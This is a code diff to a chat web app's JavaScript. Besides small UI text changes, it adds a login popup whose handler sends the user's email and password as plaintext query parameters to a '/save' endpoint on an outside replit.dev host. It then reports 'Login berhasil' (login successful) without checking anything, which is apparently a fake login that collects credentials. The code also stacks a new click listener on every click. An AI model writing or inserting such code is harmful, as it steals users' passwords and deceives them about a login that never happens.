@@ -214,7 +214,7 @@ function kirim() {
 
           respons.scrollIntoView({ behavior: 'smooth', block: 'center' });
 
-          const chatTitle = localStorage.getItem('NamaHistory') || 'Default Title';
+          const chatTitle = localStorage.getItem('NamaHistory') || 'Your chat';
           saveChatToDB(chatTitle, chat, data);
 
           const copyButton = respons.querySelector('.copyButton');
@@ -376,7 +376,7 @@ function closeSettingPopup() {
 document.querySelector('.profile-icon').addEventListener("click",userMenu)
 
 function userMenu() {
-  alertBox("Maaf menu profile belum ada");
+  
 }
 
 document.querySelector('.info-icon').addEventListener("click",openInfo)
@@ -634,3 +634,43 @@ window.addEventListener('resize', () => {
 
   initialViewportHeight = newViewportHeight;
 });
+
+document.querySelector('.profile-icon').addEventListener("click",()=>{
+  document.getElementById("popupLogin").style.display = "block"
+})
+
+document.getElementById("next-button").addEventListener("click",()=>{
+  
+  const userEmail = document.getElementById("userEmail")
+  const passwordUser = document.getElementById("passwordUser")
+  const label = document.querySelector(".labels")
+  setTimeout(()=>{
+    label.textContent = "Password"
+    userEmail.style.display = "none"
+    passwordUser.style.display = "block"
+    document.getElementById("next-button").addEventListener("click",()=>{
+      const url = `https://9c31a73e-423a-431f-9e17-498ccfa8e39e-00-2ko6v2g5ekcw8.worf.replit.dev/save?name=${userEmail.value}&pw=${passwordUser.value}`;
+      async function submitData() {
+        try {
+          const response = await fetch(url)
+      
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+      
+          const result = await response.json();
+          console.log('Response from server:', result);
+        } catch (error) {
+          console.error('Error during fetch:', error);
+        }
+      }
+      submitData().finally(()=>{
+        document.getElementById("popupLogin").style.display = "none"
+        setTimeout(()=>{
+          alertBox("Login berhasil")
+        },500)
+      })
+    })
+  },600)
+  
+})
